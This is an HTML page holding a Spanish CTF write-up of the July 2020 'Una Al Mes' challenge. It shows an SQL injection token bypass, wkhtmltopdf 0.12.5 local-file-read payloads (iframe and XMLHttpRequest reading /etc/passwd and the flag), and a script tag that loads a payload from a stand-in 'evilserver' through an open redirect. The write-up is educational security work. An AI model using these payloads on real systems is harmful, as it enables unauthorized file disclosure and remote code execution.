@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Una Al Mes - Julio 2020 :: Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="UAM - Julio Volvemos a la carga con el reto mensual de Una Al Mes, ¿qué troleada nos esperará hoy?
+Reconocimiento inicial Nos encontramos una web en la que podemos registrarnos e iniciar sesión.
+Revisando el código de la web vemos el siguiente fragmento de JavaScript ofuscado:
+javascript    document.getElementById(&amp;#34;item&amp;#34;).focus(); var _0x1e50=[&amp;#39;TOD&amp;#39;,&amp;#39;log&amp;#39;,&amp;#39;ish&amp;#39;,&amp;#39;):\x20&amp;#39;,&amp;#39;\x20an&amp;#39;,&amp;#39;int&amp;#39;,&amp;#39;nic&amp;#39;,&amp;#39;ow\x20&amp;#39;,&amp;#39;men&amp;#39;,&amp;#39;iro&amp;#39;,&amp;#39;le\x20&amp;#39;,&amp;#39;ple&amp;#39;,&amp;#39;O(h&amp;#39;,&amp;#39;the&amp;#39;]; (function(_0x886df4,_0x1e50a1){var _0x21eb8f=function(_0x40e947){while(--_0x40e947){_0x886df4[&amp;#39;push&amp;#39;](_0x886df4[&amp;#39;shift&amp;#39;]());}};_0x21eb8f(&amp;#43;&amp;#43;_0x1e50a1);}(_0x1e50,0x87));var _0x21eb=function(_0x886df4,_0x1e50a1){_0x886df4=_0x886df4-0x0;var _0x21eb8f=_0x1e50[_0x886df4];return _0x21eb8f;};function hi(){console[_0x21eb(&amp;#39;0x6&amp;#39;)](_0x21eb(&amp;#39;0x5&amp;#39;)&amp;#43;_0x21eb(&amp;#39;0x3&amp;#39;)&amp;#43;_0x21eb(&amp;#39;0xc&amp;#39;)&amp;#43;_0x21eb(&amp;#39;0x0&amp;#39;)&amp;#43;_0x21eb(&amp;#39;0xb&amp;#39;)&amp;#43;_0x21eb(&amp;#39;0x8&amp;#39;)&amp;#43;&amp;#39;Fin&amp;#39;&amp;#43;_0x21eb(&amp;#39;0x7&amp;#39;)&amp;#43;_0x21eb(&amp;#39;0x9&amp;#39;)&amp;#43;&amp;#39;d\x20e&amp;#39;&amp;#43;&amp;#39;nab&amp;#39;&amp;#43;_0x21eb(&amp;#39;0x1&amp;#39;)&amp;#43;_0x21eb(&amp;#39;0x4&amp;#39;)&amp;#43;&amp;#39;\x20pr&amp;#39;&amp;#43;_0x21eb(&amp;#39;0xa&amp;#39;)&amp;#43;&amp;#39;\x20im&amp;#39;&amp;#43;_0x21eb(&amp;#39;0x2&amp;#39;)&amp;#43;_0x21eb(&amp;#39;0xd&amp;#39;)&amp;#43;&amp;#39;tat&amp;#39;&amp;#43;&amp;#39;ion&amp;#39;);}   Limpiando y ordenando un poco
+javascript    var data=[&amp;#39;TOD&amp;#39;,&amp;#39;log&amp;#39;,&amp;#39;ish&amp;#39;,&amp;#39;):\x20&amp;#39;,&amp;#39;\x20an&amp;#39;,&amp;#39;int&amp;#39;,&amp;#39;nic&amp;#39;,&amp;#39;ow\x20&amp;#39;,&amp;#39;men&amp;#39;,&amp;#39;iro&amp;#39;,&amp;#39;le\x20&amp;#39;,&amp;#39;ple&amp;#39;,&amp;#39;O(h&amp;#39;,&amp;#39;the&amp;#39;]; (function(data, index) { var reorder = function(index) { while (--index) { data." />
+<meta name="keywords" content="XSS, sqli, ctf" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://raulmart.in/posts/uam-julio/" />
+
+
+
+
+
+
+
+<link rel="stylesheet" href="https://raulmart.in/css/style.min.css">
+
+
+
+
+<link rel="stylesheet" href="https://raulmart.in/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://raulmart.in/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://raulmart.in/img/favicon/orange.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+<meta name="twitter:creator" content="Raúl Martín" />
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Una Al Mes - Julio 2020 :: Blog">
+<meta property="og:description" content="Writeup del reto de Julio de 2020 de Una Al Mes" />
+<meta property="og:url" content="https://raulmart.in/posts/uam-julio/" />
+<meta property="og:site_name" content="Una Al Mes - Julio 2020" />
+
+  <meta property="og:image" content="https://raulmart.in/cover/uam-julio.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2020-07-16 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="orange">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Blog
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/tags/writeup/">WriteUps</a></li>
+        
+      
+      
+    
+
+    
+    <div class="spacer"></div>
+    <ul class="language-selector">
+      <ul class="language-selector-current">
+          <li>English ▾</li>
+      </ul>
+      <ul class="language-selector__more hidden">
+        
+        <li><a href="https://raulmart.in/">English</a></li>
+        
+        <li><a href="https://raulmart.in/es/">Español</a></li>
+        
+      </ul>
+    </ul>
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/tags/writeup/">WriteUps</a></li>
+      
+    
+    
+    <hr />
+        
+          <li>
+            <a href="https://raulmart.in/">English</a>
+          </li>
+        
+          <li>
+            <a href="https://raulmart.in/es/">Español</a>
+          </li>
+        
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://raulmart.in/posts/uam-julio/">Una Al Mes - Julio 2020</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2020-07-16 
+      </span>
+    
+    
+    <span class="post-author">:: Raúl Martín</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://raulmart.in/tags/writeup/">writeup</a>&nbsp;
+    
+    #<a href="https://raulmart.in/tags/ctf/">ctf</a>&nbsp;
+    
+    #<a href="https://raulmart.in/tags/uam/">uam</a>&nbsp;
+    
+    #<a href="https://raulmart.in/tags/web/">web</a>&nbsp;
+    
+    #<a href="https://raulmart.in/tags/sqli/">sqli</a>&nbsp;
+    
+    #<a href="https://raulmart.in/tags/xss/">XSS</a>&nbsp;
+    
+  </span>
+  
+
+  
+    <img src="https://raulmart.in/cover/uam-julio.png" class="post-cover" alt="Una Al Mes - Julio 2020" />
+  
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="uam---julio">UAM - Julio<a href="#uam---julio" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p><img src="images/1dc80ca36429451080f065720045e810.png" alt="c5ad8f95b6c78cc9d635813c3f5f855e.png"></p>
+<p>Volvemos a la carga con el reto mensual de <a href="https://unaalmes.hispasec.com/">Una Al Mes</a>, ¿qué troleada nos esperará hoy?</p>
+<h2 id="reconocimiento-inicial">Reconocimiento inicial<a href="#reconocimiento-inicial" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Nos encontramos una web en la que podemos registrarnos e iniciar sesión.</p>
+<p><img src="images/ecc9370870a64221a1d9a5657ab23219.png" alt="8416f07c9aebc0358ee0ed8ee6e1b57a.png"></p>
+<p>Revisando el código de la web vemos el siguiente fragmento de JavaScript ofuscado:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="263941587" type="checkbox"  />
+    <label for="263941587">
+      <span class="collapsable-code__language">javascript</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-javascript" ><code>
+document.getElementById(&#34;item&#34;).focus();
+var _0x1e50=[&#39;TOD&#39;,&#39;log&#39;,&#39;ish&#39;,&#39;):\x20&#39;,&#39;\x20an&#39;,&#39;int&#39;,&#39;nic&#39;,&#39;ow\x20&#39;,&#39;men&#39;,&#39;iro&#39;,&#39;le\x20&#39;,&#39;ple&#39;,&#39;O(h&#39;,&#39;the&#39;];
+(function(_0x886df4,_0x1e50a1){var _0x21eb8f=function(_0x40e947){while(--_0x40e947){_0x886df4[&#39;push&#39;](_0x886df4[&#39;shift&#39;]());}};_0x21eb8f(&#43;&#43;_0x1e50a1);}(_0x1e50,0x87));var _0x21eb=function(_0x886df4,_0x1e50a1){_0x886df4=_0x886df4-0x0;var _0x21eb8f=_0x1e50[_0x886df4];return _0x21eb8f;};function hi(){console[_0x21eb(&#39;0x6&#39;)](_0x21eb(&#39;0x5&#39;)&#43;_0x21eb(&#39;0x3&#39;)&#43;_0x21eb(&#39;0xc&#39;)&#43;_0x21eb(&#39;0x0&#39;)&#43;_0x21eb(&#39;0xb&#39;)&#43;_0x21eb(&#39;0x8&#39;)&#43;&#39;Fin&#39;&#43;_0x21eb(&#39;0x7&#39;)&#43;_0x21eb(&#39;0x9&#39;)&#43;&#39;d\x20e&#39;&#43;&#39;nab&#39;&#43;_0x21eb(&#39;0x1&#39;)&#43;_0x21eb(&#39;0x4&#39;)&#43;&#39;\x20pr&#39;&#43;_0x21eb(&#39;0xa&#39;)&#43;&#39;\x20im&#39;&#43;_0x21eb(&#39;0x2&#39;)&#43;_0x21eb(&#39;0xd&#39;)&#43;&#39;tat&#39;&#43;&#39;ion&#39;);}
+</code></pre>
+  </div>
+
+
+<p>Limpiando y ordenando un poco</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="715489263" type="checkbox"  />
+    <label for="715489263">
+      <span class="collapsable-code__language">javascript</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-javascript" ><code>
+var data=[&#39;TOD&#39;,&#39;log&#39;,&#39;ish&#39;,&#39;):\x20&#39;,&#39;\x20an&#39;,&#39;int&#39;,&#39;nic&#39;,&#39;ow\x20&#39;,&#39;men&#39;,&#39;iro&#39;,&#39;le\x20&#39;,&#39;ple&#39;,&#39;O(h&#39;,&#39;the&#39;];
+(function(data, index) {
+    var reorder = function(index) {
+        while (--index) {
+            data.push(data.shift());
+        }
+    };
+    reorder(&#43;&#43;index);
+}(data, 0x87));
+
+// data = &#34;iro,le ,ple,O(h,the,TOD,log,ish,): , an,int,nic,ow ,men&#34;
+var getItem = function(index, data) {
+    index = index - 0x0;
+    var item = data[index];
+    return item;
+};
+
+function hi() {
+    console[getItem(&#39;0x6&#39;)](getItem(&#39;0x5&#39;) &#43; getItem(&#39;0x3&#39;) &#43; getItem(&#39;0xc&#39;) &#43; getItem(&#39;0x0&#39;) &#43; getItem(&#39;0xb&#39;) &#43; getItem(&#39;0x8&#39;) &#43; &#39;Fin&#39; &#43; getItem(&#39;0x7&#39;) &#43; getItem(&#39;0x9&#39;) &#43; &#39;d\x20e&#39; &#43; &#39;nab&#39; &#43; getItem(&#39;0x1&#39;) &#43; getItem(&#39;0x4&#39;) &#43; &#39;\x20pr&#39; &#43; getItem(&#39;0xa&#39;) &#43; &#39;\x20im&#39; &#43; getItem(&#39;0x2&#39;) &#43; getItem(&#39;0xd&#39;) &#43; &#39;tat&#39; &#43; &#39;ion&#39;);
+    // &#34;TODO(how ironic): Finish and enable the print implementation&#34;
+}
+
+</code></pre>
+  </div>
+
+
+<p>Lo que nos dará una pista sobre la existencia del endpoint <code>/print</code></p>
+<p>Tras registrarnos e iniciar sesión, accederemos a un ToDo List, donde podemos añadir y eliminar tareas.</p>
+<p><img src="images/dfab7de5ad0b417c90e13f2e9c4cb2ab.png" alt="37c63a9d0a28e7787a548f9e025f0387.png"></p>
+<p>Probando varios payloads típicos de STI/XSS no obtenemos resultados, por lo que pasamos al endpoint <code>/print</code>.</p>
+<p><img src="images/c5a3e78507ed414088de598f1a221d2c.png" alt="07db28df2eae6e5e23159951e3e3bc70.png"></p>
+<p>pero que</p>
+<p><img src="images/8a1b323643514b05bf22805df2ca0c14.png" alt="a843e8ce6b34130ed23e95076f2ffb9f.png"></p>
+<p>Como curiosidad, si hacemos <code>From Hex</code> en Cyberchef de la dirección bitcoin  <code>0x7369206375656c61206375656c6120582d44</code> obtenemos <code>si cuela cuela X-D</code>. Baia baia, ya estaba preparando la cartera.</p>
+<h2 id="activando-print">Activando /print<a href="#activando-print" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Si intentamos acceder a <code>/print</code>, veremos que no tenemos permiso, y nos redirige a <code>/subscribe</code></p>
+<p>Probando varias SQLi típicas con una de ellas nos saltamos la validación del token
+<code>1&quot; or &quot;1&quot;=&quot;1</code></p>
+<p><img src="images/2835a55f33c2417f93a5fcd818f41870.png" alt="a38ac47643ad9a88347043a2e08d4e43.png"></p>
+<p>Y dándole a imprimir:</p>
+<p><img src="images/4a1978551c864007903ed418a1cb18b2.png" alt="8c3fefd863c5007858cafff2c67b6b0a.png"></p>
+<p>¡Ojo! ¡Tenemos texto en cursiva!</p>
+<p><img src="images/83fb86850ca841b48488c12abf05e68e.png" alt="3243653fa1f804a025e2182ad8647c6c.png"></p>
+<p>Parece que cualquier fragmento HTML será interpretado por el conversor PDF.</p>
+<h2 id="el-conversor-pdf">El conversor PDF<a href="#el-conversor-pdf" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Descargando el PDF y analizándolo con <code>exiftool</code> obtenemos la siguiente información:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="185496327" type="checkbox"  />
+    <label for="185496327">
+      <span class="collapsable-code__language">ExifTool</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-ExifTool" ><code>
+ExifTool Version Number         : 12.01
+File Name                       : document.pdf
+Directory                       : .
+File Size                       : 15 kB
+File Modification Date/Time     : 2020:07:15 16:23:24&#43;02:00
+File Access Date/Time           : 2020:07:15 16:23:45&#43;02:00
+File Inode Change Date/Time     : 2020:07:15 16:23:27&#43;02:00
+File Permissions                : rw-r--r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.4
+Linearized                      : No
+Title                           : 
+Creator                         : wkhtmltopdf 0.12.5
+Producer                        : Qt 4.8.7
+Create Date                     : 2020:07:15 14:13:11Z
+Page Count                      : 1
+Page Mode                       : UseOutlines
+</code></pre>
+  </div>
+
+
+<p>El campo más interesante es <code>Creator</code>, buscando en Google sobre la herramienta <code>wkhtmltopdf</code>, vemos que se trata de un conversor HTML a PDF:</p>
+<ul>
+<li>Web: <a href="https://wkhtmltopdf.org/">https://wkhtmltopdf.org/</a></li>
+<li>Versión actual: 0.12.6</li>
+<li>Versión en el servidor: 0.12.5</li>
+<li>Changelog:
+<img src="images/6de404c855454940bfc668f29a9fd8aa.png" alt="c867a7ecdc0e04c1b4ec424910054949.png"></li>
+</ul>
+<p>Interesante, en la versión que utiliza el servidor parece que podemos leer cualquier fichero.</p>
+<h2 id="ruta-a-usando-iframe">Ruta A: Usando iframe<a href="#ruta-a-usando-iframe" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Si accedemos al servicio <code>localhost:8000</code>, nos dirá una pista con la localización de la flag, aunque no es necesario:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="183254796" type="checkbox"  />
+    <label for="183254796">
+      <span class="collapsable-code__language">html</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-html" ><code>
+&lt;iframe src=&#34;http://localhost:8000&#34;&gt; &lt;/iframe&gt;
+</code></pre>
+  </div>
+
+
+<p><img src="images/8b48309030d84da4b7f2a95d236cdbdd.png" alt="4d1067e54208a370923b7835cdad57ef.png"></p>
+<p>Por lo que nos quedaria pedir la flag.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="378519624" type="checkbox"  />
+    <label for="378519624">
+      <span class="collapsable-code__language">html</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-html" ><code>
+&lt;iframe src=&#34;file:///flag.txt&#34;&gt; &lt;/iframe&gt;
+</code></pre>
+  </div>
+
+
+<p><img src="images/f5cf3ae31bb546d08af3fc0bc6344fb7.png" alt="d6e25460bf29edc6103c93d2b80fd5fb.png"></p>
+<p>Y ya estaría resuelto</p>
+<p>Flag: <code>UAM{d03255b2e66affef2fd2c86332a26890}</code></p>
+<p>Solo quedaria volver a la página de la UAM y enviarla.</p>
+<p><img src="images/69a9de4a3bd149e69aaedd06b2732ac7.png" alt="6a455dd9fdd3ed7be84a30da025e74fe.png"></p>
+<p>Espera un momento&hellip;</p>
+<p><img src="images/38998fda3b544320932eba4b22889e56.png" alt="67f6c2f35395818d9187ff0aea087eaa.png"></p>
+<p>Si nos fijamos hay un scroll bastante sospechoso.
+<img src="images/4e9f85b5a03842c5a3b646d09dd8d5c0.png" alt="b5ae21005294686861928ede50a15f90.png">
+Probemos a hacer el iframe gigantesco y ver que más nos puede ofrecer.
+
+
+
+  <div class="collapsable-code">
+    <input id="698251743" type="checkbox"  />
+    <label for="698251743">
+      <span class="collapsable-code__language">html</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-html" ><code>
+&lt;iframe src=&#34;file:///flag.txt&#34; height=&#34;10000px&#34;&gt; &lt;/iframe&gt;
+</code></pre>
+  </div>
+
+
+<img src="images/82d57ef4b3bd4ffe9c45817eebe1e632.png" alt="30765bf4313131377f97083088bc2cfa.png">
+Seguimos haciendo scroll&hellip;.
+<img src="images/5a956de3bc5b43a6a280088ef92f31e4.png" alt="3370bfa20915f22015a4ac7a4bed8151.png"></p>
+<p>¡Ahora sí!
+Flag: <code>UAM{dfe2e5a16a35044e273ca531939787b8}</code></p>
+<h2 id="ruta-b-usando-script">Ruta B: Usando script<a href="#ruta-b-usando-script" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>En una issue de Github del propio proyecto (<a href="https://github.com/wkhtmltopdf/wkhtmltopdf/issues/4536">https://github.com/wkhtmltopdf/wkhtmltopdf/issues/4536</a>) tenemos un PoC funcional:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="938671542" type="checkbox"  />
+    <label for="938671542">
+      <span class="collapsable-code__language">HTML</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-HTML" ><code>
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=UTF-8&#34;&gt;
+
+&lt;body&gt;
+
+&lt;script&gt;
+x=new XMLHttpRequest;
+x.onload=function(){
+document.write(this.responseText)
+};
+x.open(&#34;GET&#34;,&#34;file:///etc/passwd&#34;);
+x.send();
+&lt;/script&gt;
+
+&lt;/body&gt;&lt;/html&gt;
+</code></pre>
+  </div>
+
+
+<p>Adaptándolo ligeramente para nuestro caso de uso:
+
+
+
+  <div class="collapsable-code">
+    <input id="642319785" type="checkbox"  />
+    <label for="642319785">
+      <span class="collapsable-code__language">html</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-html" ><code>
+&lt;script&gt; x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open(&#34;GET&#34;,&#34;file:///etc/passwd&#34;); x.send(); &lt;/script&gt;
+</code></pre>
+  </div>
+
+</p>
+<p><img src="images/3263b35aac664bc3a95e461fa10572d2.png" alt="1ee201bffaf470ae480eec6de0973530.png"></p>
+
+
+
+  <div class="collapsable-code">
+    <input id="268947531" type="checkbox"  />
+    <label for="268947531">
+      <span class="collapsable-code__language">html</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-html" ><code>
+&lt;script&gt; x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open(&#34;GET&#34;,&#34;file:///flag.txt&#34;); x.send(); &lt;/script&gt;
+</code></pre>
+  </div>
+
+
+<p><img src="images/9605a54c8d72423ab9fbf36cceab9a6a.png" alt="b5e28a51264abb792b647698aba1e5a2.png"></p>
+<h2 id="extra-extra">Extra! Extra!<a href="#extra-extra" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>En la raíz podemos ver la URL <code>http://34.253.120.147:1730/redirect?url=%2Fregister</code>, la cual es un Open Redirect de manual.</p>
+<p>Ejemplo: http://34.253.120.147:1730/redirect?url=https://www.youtube.com/watch?v=dQw4w9WgXcQ</p>
+<p>Podría haber sido necesaria en caso de que el conversor PDF fuera más estricto o hubiera un WAF que nos eliminara/filtrara el payload antes de pasarselo al conversor, por ejemplo eliminando todas las referencias a páginas externas o bloqueando el protocolo file, algo asi como <code>if !URL.startsWith('http://34.253.120.147:1730...'</code>.</p>
+<p>Para saltarnos restricciones así, podríamos usar:
+
+
+
+  <div class="collapsable-code">
+    <input id="756149832" type="checkbox"  />
+    <label for="756149832">
+      <span class="collapsable-code__language">html</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-html" ><code>
+&lt;script src=&#34;http://34.253.120.147:1730/redirect?url=http://evilserver/payload&#34;&gt; &lt;/script&gt;
+</code></pre>
+  </div>
+
+
+y desde nuestro server ejecutar lo que queramos.</p>
+<p>Cualquier feedback sobre el writeup es bienvenido :)</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="https://raulmart.in/posts/cybex-ctf-2020/">
+                <span class="button__text">Cybex 2020 CTF</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script src="https://raulmart.in/js/menu.js"></script>
+<script src="https://raulmart.in/js/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
